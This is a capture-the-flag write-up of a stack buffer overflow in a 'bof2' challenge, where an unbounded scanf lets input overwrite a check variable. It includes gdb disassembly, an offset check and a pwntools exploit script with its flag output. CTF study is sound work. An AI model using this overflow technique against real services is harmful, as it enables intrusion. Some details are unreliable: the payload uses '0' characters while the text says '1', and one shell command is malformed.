So let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h> 
#include "pwnable_harness.h"

void win(void) {
	char flag[64];
	
	FILE* fp = fopen("flag.txt", "r");
	if(!fp) {
		puts("error, contact admin");
		exit(0);
	}
	
	fgets(flag, sizeof(flag), fp);
	fclose(fp);
	puts(flag);
}

void handle_connection(int sock) {
	int correct = 0;
	char bof[64];
	
	scanf("%s", bof);
	
	if(correct != 0xdeadbeef) {
		puts("you suck!");
		exit(0);
	}
	
	win();
}


int main(int argc, char** argv) {
	/* Defaults: Run on port 9001 for 30 seconds as user "ctf_bof2" in a chroot */
	server_options opts = {
		.user = "ctf_bof2",
		.chrooted = true,
		.port = 9001,
		.time_limit_seconds = 30
	};
	
	return server_main(argc, argv, opts, &handle_connection);
}
```

So from the looks of this, it seems like it is a program that just accepts imput, checks to see if a variable that you have no direct input is equal to the hex value "0xdeadbeef", and if it is it gives you the flag.
This program is vulnerable to a buffer overflow attack.

```
	char bof[64];
	
	scanf("%s", bof)
```

Right there in the code, it designates a space for the scanf function to write to, which is 64 characters. The thing is it isn't defined how much data can be writen to the buffer. So it is possible to write over 64 characters, and to start overwriting various values on the stack such as the correct variavle.
The first step in solving this will be to find the amount of data we will need to input, before we can start overwriting correct. it should be 64 since that is the size of the buffer and the buffer is so close to the correct variable, but let's confirm it.

First we need to make a payload contating 65 "1" which we will feed to the program in gdb

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/bof2$ echo python -c 'print "0"*65 > /tmp/payload
```

Now we open it in gdb, and disassemble the vulnerable function, and set a breakpoint for the if then statement.

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/bof2$ gdb ./bof2
gdb-peda$ disas handle_connection 
Dump of assembler code for function handle_connection:
   0x0804870d <+0>:	push   ebp
   0x0804870e <+1>:	mov    ebp,esp
   0x08048710 <+3>:	sub    esp,0x58
   0x08048713 <+6>:	mov    DWORD PTR [ebp-0xc],0x0
   0x0804871a <+13>:	sub    esp,0x8
   0x0804871d <+16>:	lea    eax,[ebp-0x4c]
   0x08048720 <+19>:	push   eax
   0x08048721 <+20>:	push   0x8048850
   0x08048726 <+25>:	call   0x8048580 <__isoc99_scanf@plt>
   0x0804872b <+30>:	add    esp,0x10
   0x0804872e <+33>:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef
   0x08048735 <+40>:	je     0x8048751 <handle_connection+68>
   0x08048737 <+42>:	sub    esp,0xc
   0x0804873a <+45>:	push   0x8048853
   0x0804873f <+50>:	call   0x8048530 <puts@plt>
   0x08048744 <+55>:	add    esp,0x10
   0x08048747 <+58>:	sub    esp,0xc
   0x0804874a <+61>:	push   0x0
   0x0804874c <+63>:	call   0x8048540 <exit@plt>
   0x08048751 <+68>:	call   0x804869b <win>
   0x08048756 <+73>:	nop
   0x08048757 <+74>:	leave  
   0x08048758 <+75>:	ret    
End of assembler dump.
gdb-peda$ b *handle_connection+33
```

Now we run the program with the payload we just made, and evaluate the register which is storing the data which will be evaluated to see if the payload overwrote it (if our previous predictions were right it should be "1").

```
gdb-peda$ r < /tmp/payload
Breakpoint 1, 0x0804872e in handle_connection ()
gdb-peda$ x $ebp-0xc
0xffffceec:	"1"
```

As you can see, it is indeed "1". This means that our prediciton was right and that the distance to start overwriting the value which will be evaluated is 64. Now time to write and exploit for this using python.

```
#Import pwntools
from pwn import *

#Establish the remote connection
conn = remote('ctf.hackucf.org', 9001)

#Make the payload, send 0xdeadbeef over in little endian so the elf will read it properly
payload = "0"*64 + "\xef\xbe\xad\xde"

#Send the payload
conn.sendline(payload)

#Print the flag
print conn.recvline()
```

And now we run the exploit.

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/bof2$ python exploit.py 
[+] Opening connection to ctf.hackucf.org on port 9001: Done
flag{buffers_and_beef_make_for_a_yummie_pwn_steak}

[*] Closed connection to ctf.hackucf.org port 9001
```

And just like that, we pwn the elf


